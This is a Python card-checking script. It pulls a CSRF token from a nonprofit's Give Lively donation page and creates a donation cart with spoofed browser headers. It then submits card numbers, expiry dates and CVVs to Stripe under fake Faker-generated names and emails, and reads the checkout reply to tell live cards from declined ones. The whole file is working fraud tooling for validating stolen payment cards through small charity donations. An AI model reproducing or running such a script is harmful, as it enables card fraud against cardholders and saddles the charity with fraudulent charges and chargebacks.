import re, random, requests
from bs4 import BeautifulSoup
from faker import Faker
from rich import print

fake = Faker("es_MX")
def mails():
    dominios = ['hotmail.com', 'gmail.com', 'outlook.com', 'yahoo.com']
    nombre_usuario = fake.user_name().replace(" ", "").replace(".", "").replace("-", "").lower()
    dominio = random.choice(dominios)
    correo = f"{nombre_usuario}@{dominio}"
    return correo

def name():
    name = f"{fake.first_name()} {fake.last_name()}"
    name = name.replace(" ", "+")
    return name

def csfr():
    url = "https://secure.givelively.org/donate/sakura-foundation/donation-to-sakura-foundation?recurring=false&override_amount=1&dedication_name=&dedication_email=&dedication_type=&widget_type=simple_donation&widget_url=https%3A%2F%2Fsakurafoundation.org%2Fdonate%2F&referrer_url=https%3A%2F%2Fwww.google.com%2F&isWixEmbedded=false"
    headers = {
  "Host": "secure.givelively.org",
  "Connection": "keep-alive",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "sec-ch-ua-mobile": "?1",
  "sec-ch-ua-platform": "\"Android\"",
  "Upgrade-Insecure-Requests": "1",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.6",
  "Sec-Fetch-Site": "cross-site",
  "Sec-Fetch-Mode": "navigate",
  "Sec-Fetch-User": "?1",
  "Sec-Fetch-Dest": "iframe",
  "Sec-Fetch-Storage-Access": "none",
  "Referer": "https://sakurafoundation.org/",
  "Accept-Encoding": "gzip, deflate, br, zstd"
    }
    res = requests.get(url, headers=headers)
    html = res.text
    soup = BeautifulSoup(html, 'html.parser')
    meta = soup.find('meta', attrs={'name': 'csrf-token'})
    if meta and 'content' in meta.attrs:
        raw_content = meta['content']
        inner_soup = BeautifulSoup(raw_content, 'html.parser')
        inner_meta = inner_soup.find('meta', attrs={'name': 'csrf-token'})
        cfr = inner_meta['content'] if inner_meta else raw_content
        return cfr
    else:
        return "Token no encontrado"

def main(si):
    try:
        sess = requests.Session()
        cfr = csfr()
        sess = requests.Session()
        card = si.replace("/", "|")
        num, mes, ano, cvv = card.strip().split("|")
        
        url = "https://secure.givelively.org/carts/access_tokens/new?application=simple_donation"
        headers = {
  "Host": "secure.givelively.org",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "sec-ch-ua-mobile": "?1",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json",
  "x-datadome-clientid": ".keep",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.8",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Storage-Access": "none",
  "Referer": "https://secure.givelively.org/donate/sakura-foundation/donation-to-sakura-foundation?recurring=false&override_amount=1&dedication_name=&dedication_email=&dedication_type=&widget_type=simple_donation&widget_url=https%3A%2F%2Fsakurafoundation.org%2Fdonate%2F&referrer_url=https%3A%2F%2Fwww.google.com%2F&isWixEmbedded=false",
  "Accept-Encoding": "gzip, deflate, br, zstd"
        }
        res = sess.get(url, headers=headers)
        access = res.json()["accessToken"]
        url1 = "https://secure.givelively.org/carts"
        headers1= {
  "Host": "secure.givelively.org",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "sec-ch-ua-mobile": "?1",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json",
  "Content-Type": "application/json",
  "x-datadome-clientid": ".keep",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.8",
  "Origin": "https://secure.givelively.org",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Storage-Access": "none"
        }
        data1 = f"""
{{
  "cart_owner": "default",
  "order_tracking_attributes": {{
    "utm_source": null,
    "widget_type": "simple_donation",
    "widget_url": "https://sakurafoundation.org/donate/",
    "referrer_url": "https://www.google.com/"
  }},
  "ref_id": null,
  "donation_page_context_id": "4ef192eb-d7cf-4bed-a404-8bbdb49c7c8b",
  "donation_page_context_type": "Campaign",
  "items_attributes": [
    {{
      "amount": 100,
      "recurring": false,
      "anonymous_to_public": false,
      "nonprofit_id": "00ff4586-e6de-4b92-93ba-097d75c6e7aa",
      "dedication_attributes": {{
        "name": "",
        "email": "",
        "type": ""
      }}
    }}
  ],
  "access_token": "{access}"
}}
"""
        res1 = sess.post(url1, headers=headers1, data=data1)
        cus = res1.json()["cart"]["id"]
        
        
        url2 = "https://api.stripe.com/v1/payment_methods"
        headers2 = {
  "Host": "api.stripe.com",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "Content-Type": "application/x-www-form-urlencoded",
  "sec-ch-ua-mobile": "?1",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.8",
  "Origin": "https://js.stripe.com",
  "Sec-Fetch-Site": "same-site",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Referer": "https://js.stripe.com/",
  "Accept-Encoding": "gzip, deflate, br, zstd"
        }
        data2 = f"""type=card&billing_details[name]={name()}&billing_details[email]={mails()}&card[number]={num}&card[cvc]={cvv}&card[exp_month]={mes}&card[exp_year]={ano}&guid=NA&muid=NA&sid=NA&pasted_fields=number&payment_user_agent=stripe.js%2F20e04cd437%3B+stripe-js-v3%2F20e04cd437%3B+card-element&referrer=https%3A%2F%2Fsecure.givelively.org&time_on_page=52124&key=pk_live_GWQnyoQBA8QSySDV4tPMyOgI"""
        res2 = sess.post(url2, headers=headers2, data=data2)
        pm = res2.json()["id"]
        
        
        url3 = f"https://secure.givelively.org/carts/{cus}/payment_intents/checkout"
        headers3= {
  "Host": "secure.givelively.org",
  "Connection": "keep-alive",
  "sec-ch-ua-platform": "\"Android\"",
  "sec-ch-ua": "\"Chromium\";v=\"136\", \"Brave\";v=\"136\", \"Not.A/Brand\";v=\"99\"",
  "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/136.0.0.0 Mobile Safari/537.36",
  "Accept": "application/json",
  "Content-Type": "application/json",
  "x-datadome-clientid": ".keep",
  "Sec-GPC": "1",
  "Accept-Language": "es-MX,es;q=0.8",
  "Origin": "https://secure.givelively.org",
  "Sec-Fetch-Site": "same-origin",
  "Sec-Fetch-Mode": "cors",
  "Sec-Fetch-Dest": "empty",
  "Sec-Fetch-Storage-Access": "none"
        }
        data3 = f"""
{{
  "checkout": {{
    "name": "Carlos salas",
    "email": "gemsil872@gmail.com",
    "payment_method_id": "{pm}",
    "payment_method_type": "mastercard",
    "transaction_fee_covered": false,
    "tip_amount": 0,
    "answers_attributes": [
      {{
        "custom_question_id": "b19ad58c-956f-4f9a-8af6-737b25eeea39",
        "answer_text": "Any program (General Donation to Sakura Foundation)"
      }}
    ]
  }},
  "anonymous_to_public": false,
  "donation_page_context_id": "4ef192eb-d7cf-4bed-a404-8bbdb49c7c8b",
  "donation_page_context_type": "Campaign",
  "access_token": "{access}",
  "idempotency_key": "e5938f6n-e061-471b-bfc7-efea82238cdc"
}}
"""
        res3 = sess.post(url3, headers=headers3, data=data3)
        if "Your card's security code is incorrect" in res3.text:
            return f"[green]{si} - Your card's security code is incorrect"
        elif "Your card was declined." in res3.text:
            return f"[red]{si} - Your card was declined."
        else:
            return f'[#FAA00]{si} - {res3.json()}'
    except Exception as e:
        print(f'Error: {e}')
